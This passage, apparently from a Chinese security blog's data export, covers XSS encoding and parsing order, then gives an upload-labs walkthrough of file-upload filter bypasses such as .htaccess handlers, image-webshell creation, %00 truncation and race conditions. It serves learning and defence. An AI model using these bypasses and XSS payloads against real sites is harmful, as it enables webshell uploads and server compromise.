String）</p>\n<blockquote>\n<p><code>Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals.</code></p>\n<p>即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如<code>\\u000A</code>在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是不会被解码。</p>\n</blockquote>\n<p>标识符中（in identifier names）</p>\n<blockquote>\n<p>若Unicode转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。</p>\n<p>例如，<strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;</code></strong></p>\n<p>被编码转义的部分为<code>alert</code>字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。</p>\n</blockquote>\n<p>控制字符中（in control characters）</p>\n<blockquote>\n<p>若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。</p>\n<p>控制字符即<code>&#39;</code>、<code>&quot;</code>、<code>()</code>等。</p>\n<p>例如，<strong><code>&lt;script&gt; alert\\u0028&quot;xss&quot;); &lt;/script&gt;</code></strong>，<code>(</code>进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分<code>alert(</code>。</p>\n<p>因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。</p>\n</blockquote>\n<p>总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;</code></strong></p>\n<p>被编码部分为<code>alert(11)</code>。</p>\n<p>该例子中的JS不会被执行，因为控制字符被编码了。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;</code></strong></p>\n<p>被编码部分为<code>alert</code>及括号内为<code>12</code>。</p>\n<p>该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加<code>&quot;&quot;</code>或<code>&#39;&#39;</code>使其变为字符串，作为字符串也只能作为普通字符。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;alert(&#39;13\\u0027)&lt;/script&gt;</code></strong></p>\n<p>被编码处为<code>&#39;</code>。</p>\n<p>该例的JS不会执行，因为控制字符被编码了，解码后的<code>&#39;</code>将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有<code>&#39;</code>来结束字符串。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;alert(&#39;14\\u000a&#39;)&lt;/script&gt;</code></strong></p>\n<p>该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。</p>\n</blockquote>\n<h3 id=\"0x03-解析顺序\"><a href=\"#0x03-解析顺序\" class=\"headerlink\" title=\"0x03 解析顺序\"></a>0x03 解析顺序</h3><p>首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。</p>\n<p>URL解析和JavaScript解析，它们的解析顺序要根据情况而定。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>该例子中，首先由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着URL解析器对<code>UserInput</code>进行URL decode；</p>\n<p>如果URL的Scheme部分为<code>javascript</code>的话，JavaScript解析器会再对<code>UserInput</code>进行解码。</p>\n<p>所以解析顺序是：HTML解析——&gt;URL解析——&gt;JavaScript解析。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;a href=# onclick=&quot;window.open(&#39;UserInput&#39;)&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>该例子中，首先由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着由JavaScript解析器会再对<code>onclick</code>部分的JS进行解析并执行JS；</p>\n<p>执行JS后<code>window.open(&#39;UserInput&#39;)</code>函数的参数会传入URL，所以再由URL解析器对<code>UserInput</code>部分进行解码。</p>\n<p>因此解析顺序为：HTML解析——&gt;JavaScript解析——&gt;URL解析。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;javascript:window.open(&#39;UserInput&#39;)&quot;&gt;</code></strong></p>\n<p>该例子中，首先还是由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着由URL解析器解析<code>href</code>的属性值；</p>\n<p>然后由于Scheme为<code>javascript</code>，所以由JavaScript解析；</p>\n<p>解析执行JS后<code>window.open(&#39;UserInput&#39;)</code>函数传入URL，所以再由URL解析器解析。</p>\n<p>所以解析顺序为：HTML解析——&gt;URL解析——&gt;JavaScript解析——&gt;URL解析。</p>\n</blockquote>\n<p>综合实例：</p>\n<p><strong><code>&lt;a  href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;\n&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;\n&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;\n&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;\n&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;\n&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;\n&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;\n&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;\n&amp;#x35;&amp;#x29;&quot;&gt; &lt;/a&gt;</code></strong></p>\n<p>首先HTML解析器进行解析，解析到<code>href</code>属性的值时，状态机进入<strong><code>属性值状态（Attribute Value State）</code></strong>，该状态会解码字符实体，解码得到结果：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105040.png\" alt></p>\n<p>接着由URL解析器进行解析并解码：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105254.png\" alt></p>\n<p>再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105533.png\" alt></p>\n<p>经过三轮解析解码后得到结果：<code>&lt;a href=&quot;javascript:alert(15)&quot;&gt;&lt;/a&gt;</code></p>\n<p>参考连接：</p>\n<p><a href=\"https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html\" target=\"_blank\" rel=\"noopener\">https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html</a></p>\n<p><a href=\"https://security.yirendai.com/news/share/26\" target=\"_blank\" rel=\"noopener\">https://security.yirendai.com/news/share/26</a></p>\n<p><a href=\"https://xz.aliyun.com/t/1556\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/1556</a></p>"},{"title":"文件上传漏洞（File Upload）","date":"2019-03-05T05:28:41.000Z","_content":"\n## 一、概述\n\n> 文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。\n\n### 0x00 漏洞常见危害\n\n1. 上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。\n2. 上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。\n3. 上传病毒、木马文件，并诱骗管理员或用户下载执行。\n4. 上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。\n\n<!-- more -->\n\n### 0x01 攻击条件\n\n1. 上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问）\n2. 上传的文件能被WEB容器解释执行。\n3. 文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。\n\n### 0x02 安全的上传功能\n\n1. 上传目录设置为不可执行。\n2. 判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。\n3. 使用随机数重命名上传的文件及改写路径。\n4. 文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等）\n\n### 0x03 文件上传功能\n\n> 文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。\n\n![](文件上传漏洞\\QQ截图20190305132724.png)\n\n## 二、文件解析漏洞\n\n> 解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。\n\n### 0x00 IIS解析漏洞\n\n**IIS 6.0解析漏洞**\n\n1.文件名截断，截断字符为分号（;）：\n\n- 例如文件名：`xx.asp;yy.jpg`，会被作为`xx.asp`。\n\n2.文件夹扩展名解析漏洞，`/*.asp/`目录下的所有文件都会被作为asp文件解析。\n\n- 例如：`/x.asp/y.jpg`，`y.jpg`会被作为asp文件解析。\n\n3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型：\n\n> ```\n> test.asa\n> test.cer\n> test.cdx\n> ```\n\n**IIS PUT漏洞**\n\n`PUT`是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。\n\n在IIS中，若目录具有`写权限`且`Webdav`是开启的，就会支持PUT方法。\n\n![](文件上传漏洞\\1544954468_5c162264b3e77.png)\n\n![](文件上传漏洞\\1544954489_5c16227975735.png)\n\n### 0x01 Apache解析漏洞\n\n**Apache 1.x、2.x：**\n\n- Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。\n- Apache可识别的文件后缀（类型）定义在`mime.types`文件中。\n\n> 例如文件名：`shell.php.rar.rar.rar`，Apache由于无法识别`.rar`，会从后往前一直寻找可识别的文件类型，最后会将其作为`.php`文件。\n\n### 0x02 Nginx解析漏洞\n\n**1.漏洞外在表现：**\n\n- 访问：`http://xx.com/x.jpg/y.php`，`x.jpg`会被作为php文件执行。注意`y.php`是实际不存在的。\n\n**2.漏洞原理：**\n\n- 严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。\n- 在nginx配置文件中通过正则匹配设置`SCRIPT_FILENAME`。当访问`http://xx.com/shell.jpg/test.php`这个URL时，`$fastcgi_script_name`会被设置为`shell.jpg/test.php`，然后将构造好的`SCRIPT_FILENAME`传递给cgi Server。\n- 当php开启`cgi.fix_pathinfo`这个选项时（默认开启），那么就会触发在PHP中的如下逻辑：\n  - PHP会认为`SCRIPT_FILENAME`是`shell.jpg`，而`test.php`是`PATH_INFO`，所以就会将`shell.jpg`作为PHP文件来解析了。\n- 因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。\n\n**3.漏洞修复：**\n\n- 修改`php.ini`文件，将`cgi.fix_pathinfo`的值设置为0;\n\n## 三、文件上传过滤与绕过\n\n![](文件上传漏洞\\20180712092548-81b98800-85-1.png)\n\n结合`upload-labs`文件上传漏洞靶场进行分析学习。\n\n靶场地址：`https://github.com/c0ny1/upload-labs`\n\n### 0x00 前端过滤与绕过（Pass-01）\n\n***过滤:***\n\n前端使用JS对上传的文件后缀进行限制。\n\n![](文件上传漏洞\\QQ截图20190305144900.png)\n\n***绕过:***\n\n禁用浏览器Javascript。\n\n或者使用Burpsuite抓包修改文件名的方式。\n\n![](文件上传漏洞\\QQ截图20190305145812.png)\n\n![](文件上传漏洞\\QQ截图20190305150014.png)\n\n### 0x01 后端过滤与绕过\n\n**1.Mime类型过滤：Content-Type （Pass-02）**\n\n***过滤代码：***只允许上传特定mime类型的文件。\n\n![](文件上传漏洞\\QQ截图20190305150607.png)\n\n***Mime类型过滤绕过：***\n\n抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。\n\n![](文件上传漏洞\\QQ截图20190305151049.png)\n\n**2.黑名单过滤之过滤不全 (Pass-03)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305151732.png)\n\n***绕过方式：***\n\n被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：`.php3`、`.php4`、`.phtml`等后缀。\n\n**3.黑名单过滤之未过滤.htaccess （Pass-04）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305161438.png)\n\n***绕过方式：***\n\n可以发现大部分文件后缀被过滤，但`.htaccess`未被过滤时，可以上传一个`.htaccess`文件，文件内容：\n\n> `SetHandler application/x-httpd-php`\n\n![](文件上传漏洞\\QQ截图20190305154725.png)\n\n上传这样的`.htaccess`文件后，所有文件都会被解析为php，然后再上传图片马，图片会被解析为php文件执行，就可以绕过过滤实现攻击。\n\nDOS下图片马制作：\n\n> **`copy /b a.png + /a b.php  c.png`**\n>\n> > - `/b`表示a.png是二进制文件，以二进制方式合并文件。\n> > - `/a`表示b.php是ASCII文件。（该参数可以省略）\n> > - `c.png`是合并后得到的文件。\n\n上传图片马并访问：\n\n![](文件上传漏洞\\QQ截图20190305160625.png)\n\n> PS:`.htacess`该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。`.htaccess`文件(或者”分布式配置文件”），提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。\n\n**4.黑名单过滤之未统一大小写 （Pass-05）**\n\n***过滤代码：***`strtolower()`字符串函数会将字符串的所有字符变为小写。\n\n![](文件上传漏洞\\QQ截图20190305163146.png)\n\n***绕过方式：***\n\n由于未统一大小写，导致过滤不全，可尝试`.PhP`、`.pHP`等后缀的方式绕过。\n\n**5.黑名单过滤之未去除空白 （Pass-06）**\n\n***过滤代码：***`trim()`字符串函数会将字符串首尾的空白去除。\n\n![](文件上传漏洞\\QQ截图20190305163603.png)\n\n***绕过方式：***\n\n在文件后缀前或者后面加入空白。\n\n**6.黑名单过滤之未去除\".\" （Pass-07）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305164357.png)\n\n***绕过方式：***\n\n利用windows特性，会自动去掉后缀名中最后的`.`，可在后缀名中加`.`绕过。\n\n抓包修改文件名，在文件名最后加入`.`。\n\n**6.黑名单过滤之未去除\"::$DATA\" （Pass-08）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305165249.png)\n\n***绕过方式：***\nphp在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名。目的就是不检查后缀名。\n\n即在文件名之后加`::$DATA`绕过。\n\n**7.黑名单过滤之文件名拼接 （Pass-09）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306092934.png)\n\n***绕过方式：***\n\n抓包修改文件名为：`xxxx.php. .`(点 空格 点)\n\n**8.黑名单过滤之替换后缀名 (Pass-10)**\n\n过滤代码：`str_ireplace(find,replace,string,count)`函数替换字符串中的一些字符（不区分大小写）。\n\n![](文件上传漏洞\\QQ截图20190306093435.png)\n\n***绕过方式：***\n\n使用双写后缀的方式绕过，如使用`shell.pphphp`，中间的`php`字符被替换为空后，得到`shell.php`。\n\n**9.白名单过滤之路径拼接GET (Pass-11)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306094436.png)\n\n***绕过方式：***\n\n使用`%00`截断，`%00`是URL编码后的空字符，即ASCII码为0的字符（空字符），十六进制表示为`0x00`，转义字符为`\\0`，在C、PHP等语言中空字符表示字符串的结束。\n\n![](文件上传漏洞\\QQ截图201903061003321.png)\n\n> - 截断条件：\n>   - php版本小于5.3.4 详情关注CVE-2006-7243\n>   - php的`magic_quotes_gpc`为OFF状态   //如果不修改将无法上传成功，默认为ON\n> - `%00`截断参考链接：`https://www.2cto.com/article/201502/377462.html`\n\n**10.白名单过滤之路径拼接POST （Pass-12）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306102231.png)\n\n***绕过方式：***\n\n同样使用`%00`截断绕过，但是与GET方式不同的是，由于GET提交的数据是在URL中的，因此服务器会对其进行URL decode。而POST提交的是不会进行URL解码的，因此需要在十六进进制中添加`0x00`。\n\n![](文件上传漏洞\\QQ截图20190306103406.png)\n\n![](文件上传漏洞\\QQ截图20190306103855.png)\n\n**11.文件内容过滤之内容匹配 (Pass-13)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306104525.png)\n\n***绕过方式：***\n\n使用图片马即可，图片马制作见Pass-04。\n\n**12.文件内容过滤之文件类型 (Pass-14、Pass-15)**\n\n***过滤代码：***\n\n`getimagesize (string  $filename)`返回一个具有四个单元的数组。索引0包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF...\n\n`exif_imagetype()`读取一个图像的第一个字节并检查其签名。\n\n![](文件上传漏洞\\QQ截图20190306105122.png)\n\n![](文件上传漏洞\\QQ截图20190306105746.png)\n\n***绕过方式：***\n\n使用图片马进行绕过。\n\n**13.文件内容过滤之二次渲染 (Pass-16)**\n\n***过滤代码：***\n\n`imagecreatefromjpeg`二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。\n\n![](文件上传漏洞\\QQ截图20190306112443.png)\n\n***绕过方式：***\n\n绕过方法是将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写脚本程序。\n\n二次渲染与绕过方法参考连接：`https://secgeek.net/bookfresh-vulnerability/`\n\n**14.条件竞争 （Pass-17）**\n\n***过滤代码：***`unlink()`函数作用是删除文件。若成功，则返回 true，失败则返回 false。\n\n![](文件上传漏洞\\QQ截图20190306114556.png)\n\n***绕过方式：***\n\n这里注意一个点，不管什么文件都是会被上传到服务器上的，上传到服务器之后才进行白名单检查。\n\n因此，绕过的思路就是在文件被安全检查删除之前访问文件。\n\n多个进程并发访问和操作同一数据且执行结果与访问的特定顺序有关，称为竞争条件。\n\n攻击方法：上传一个php文件，使用Burpsuite进行抓包并将数据包发送到`intruder`模块，清空变量，然后选择Payload的类型为`Null payloads`，并输入重放数据包的数量，保证不断在上传文件。同时使用浏览器不断刷新访问上传的php文件，直到访问成功。\n\n![](文件上传漏洞\\QQ截图20190306130645.png)\n\n![](文件上传漏洞\\QQ截图20190306131219.png)\n\n![](文件上传漏洞\\QQ截图20190306131709.png)\n\n**参考连接：**\n\nhttps://xz.aliyun.com/t/2435\n\nhttps://github.com/LandGrey/upload-labs-writeup\n\nhttp://www.cnblogs.com/shellr00t/p/6426856.html\n\nhttps://www.anquanke.com/post/id/164561","source":"_posts/文件上传漏洞.md","raw":"---\ntitle: 文件上传漏洞（File Upload）\ndate: 2019-03-05 13:28:41\ntags:\n\t- 文件上传\n\t- 过滤与绕过\n\t- 靶场\ncategories: WEB漏洞学习\n---\n\n## 一、概述\n\n> 文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。\n\n### 0x00 漏洞常见危害\n\n1. 上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。\n2. 上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。\n3. 上传病毒、木马文件，并诱骗管理员或用户下载执行。\n4. 上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。\n\n<!-- more -->\n\n### 0x01 攻击条件\n\n1. 上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问）\n2. 上传的文件能被WEB容器解释执行。\n3. 文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。\n\n### 0x02 安全的上传功能\n\n1. 上传目录设置为不可执行。\n2. 判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。\n3. 使用随机数重命名上传的文件及改写路径。\n4. 文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等）\n\n### 0x03 文件上传功能\n\n> 文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。\n\n![](文件上传漏洞\\QQ截图20190305132724.png)\n\n## 二、文件解析漏洞\n\n> 解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。\n\n### 0x00 IIS解析漏洞\n\n**IIS 6.0解析漏洞**\n\n1.文件名截断，截断字符为分号（;）：\n\n- 例如文件名：`xx.asp;yy.jpg`，会被作为`xx.asp`。\n\n2.文件夹扩展名解析漏洞，`/*.asp/`目录下的所有文件都会被作为asp文件解析。\n\n- 例如：`/x.asp/y.jpg`，`y.jpg`会被作为asp文件解析。\n\n3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型：\n\n> ```\n> test.asa\n> test.cer\n> test.cdx\n> ```\n\n**IIS PUT漏洞**\n\n`PUT`是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。\n\n在IIS中，若目录具有`写权限`且`Webdav`是开启的，就会支持PUT方法。\n\n![](文件上传漏洞\\1544954468_5c162264b3e77.png)\n\n![](文件上传漏洞\\1544954489_5c16227975735.png)\n\n### 0x01 Apache解析漏洞\n\n**Apache 1.x、2.x：**\n\n- Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。\n- Apache可识别的文件后缀（类型）定义在`mime.types`文件中。\n\n> 例如文件名：`shell.php.rar.rar.rar`，Apache由于无法识别`.rar`，会从后往前一直寻找可识别的文件类型，最后会将其作为`.php`文件。\n\n### 0x02 Nginx解析漏洞\n\n**1.漏洞外在表现：**\n\n- 访问：`http://xx.com/x.jpg/y.php`，`x.jpg`会被作为php文件执行。注意`y.php`是实际不存在的。\n\n**2.漏洞原理：**\n\n- 严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。\n- 在nginx配置文件中通过正则匹配设置`SCRIPT_FILENAME`。当访问`http://xx.com/shell.jpg/test.php`这个URL时，`$fastcgi_script_name`会被设置为`shell.jpg/test.php`，然后将构造好的`SCRIPT_FILENAME`传递给cgi Server。\n- 当php开启`cgi.fix_pathinfo`这个选项时（默认开启），那么就会触发在PHP中的如下逻辑：\n  - PHP会认为`SCRIPT_FILENAME`是`shell.jpg`，而`test.php`是`PATH_INFO`，所以就会将`shell.jpg`作为PHP文件来解析了。\n- 因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。\n\n**3.漏洞修复：**\n\n- 修改`php.ini`文件，将`cgi.fix_pathinfo`的值设置为0;\n\n## 三、文件上传过滤与绕过\n\n![](文件上传漏洞\\20180712092548-81b98800-85-1.png)\n\n结合`upload-labs`文件上传漏洞靶场进行分析学习。\n\n靶场地址：`https://github.com/c0ny1/upload-labs`\n\n### 0x00 前端过滤与绕过（Pass-01）\n\n***过滤:***\n\n前端使用JS对上传的文件后缀进行限制。\n\n![](文件上传漏洞\\QQ截图20190305144900.png)\n\n***绕过:***\n\n禁用浏览器Javascript。\n\n或者使用Burpsuite抓包修改文件名的方式。\n\n![](文件上传漏洞\\QQ截图20190305145812.png)\n\n![](文件上传漏洞\\QQ截图20190305150014.png)\n\n### 0x01 后端过滤与绕过\n\n**1.Mime类型过滤：Content-Type （Pass-02）**\n\n***过滤代码：***只允许上传特定mime类型的文件。\n\n![](文件上传漏洞\\QQ截图20190305150607.png)\n\n***Mime类型过滤绕过：***\n\n抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。\n\n![](文件上传漏洞\\QQ截图20190305151049.png)\n\n**2.黑名单过滤之过滤不全 (Pass-03)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305151732.png)\n\n***绕过方式：***\n\n被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：`.php3`、`.php4`、`.phtml`等后缀。\n\n**3.黑名单过滤之未过滤.htaccess （Pass-04）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305161438.png)\n\n***绕过方式：***\n\n可以发现大部分文件后缀被过滤，但`.htaccess`未被过滤时，可以上传一个`.htaccess`文件，文件内容：\n\n> `SetHandler application/x-httpd-php`\n\n![](文件上传漏洞\\QQ截图20190305154725.png)\n\n上传这样的`.htaccess`文件后，所有文件都会被解析为php，然后再上传图片马，图片会被解析为php文件执行，就可以绕过过滤实现攻击。\n\nDOS下图片马制作：\n\n> **`copy /b a.png + /a b.php  c.png`**\n>\n> > - `/b`表示a.png是二进制文件，以二进制方式合并文件。\n> > - `/a`表示b.php是ASCII文件。（该参数可以省略）\n> > - `c.png`是合并后得到的文件。\n\n上传图片马并访问：\n\n![](文件上传漏洞\\QQ截图20190305160625.png)\n\n> PS:`.htacess`该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。`.htaccess`文件(或者”分布式配置文件”），提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。\n\n**4.黑名单过滤之未统一大小写 （Pass-05）**\n\n***过滤代码：***`strtolower()`字符串函数会将字符串的所有字符变为小写。\n\n![](文件上传漏洞\\QQ截图20190305163146.png)\n\n***绕过方式：***\n\n由于未统一大小写，导致过滤不全，可尝试`.PhP`、`.pHP`等后缀的方式绕过。\n\n**5.黑名单过滤之未去除空白 （Pass-06）**\n\n***过滤代码：***`trim()`字符串函数会将字符串首尾的空白去除。\n\n![](文件上传漏洞\\QQ截图20190305163603.png)\n\n***绕过方式：***\n\n在文件后缀前或者后面加入空白。\n\n**6.黑名单过滤之未去除\".\" （Pass-07）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305164357.png)\n\n***绕过方式：***\n\n利用windows特性，会自动去掉后缀名中最后的`.`，可在后缀名中加`.`绕过。\n\n抓包修改文件名，在文件名最后加入`.`。\n\n**6.黑名单过滤之未去除\"::$DATA\" （Pass-08）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305165249.png)\n\n***绕过方式：***\nphp在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名。目的就是不检查后缀名。\n\n即在文件名之后加`::$DATA`绕过。\n\n**7.黑名单过滤之文件名拼接 （Pass-09）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306092934.png)\n\n***绕过方式：***\n\n抓包修改文件名为：`xxxx.php. .`(点 空格 点)\n\n**8.黑名单过滤之替换后缀名 (Pass-10)**\n\n过滤代码：`str_ireplace(find,replace,string,count)`函数替换字符串中的一些字符（不区分大小写）。\n\n![](文件上传漏洞\\QQ截图20190306093435.png)\n\n***绕过方式：***\n\n使用双写后缀的方式绕过，如使用`shell.pphphp`，中间的`php`字符被替换为空后，得到`shell.php`。\n\n**9.白名单过滤之路径拼接GET (Pass-11)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306094436.png)\n\n***绕过方式：***\n\n使用`%00`截断，`%00`是URL编码后的空字符，即ASCII码为0的字符（空字符），十六进制表示为`0x00`，转义字符为`\\0`，在C、PHP等语言中空字符表示字符串的结束。\n\n![](文件上传漏洞\\QQ截图201903061003321.png)\n\n> - 截断条件：\n>   - php版本小于5.3.4 详情关注CVE-2006-7243\n>   - php的`magic_quotes_gpc`为OFF状态   //如果不修改将无法上传成功，默认为ON\n> - `%00`截断参考链接：`https://www.2cto.com/article/201502/377462.html`\n\n**10.白名单过滤之路径拼接POST （Pass-12）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306102231.png)\n\n***绕过方式：***\n\n同样使用`%00`截断绕过，但是与GET方式不同的是，由于GET提交的数据是在URL中的，因此服务器会对其进行URL decode。而POST提交的是不会进行URL解码的，因此需要在十六进进制中添加`0x00`。\n\n![](文件上传漏洞\\QQ截图20190306103406.png)\n\n![](文件上传漏洞\\QQ截图20190306103855.png)\n\n**11.文件内容过滤之内容匹配 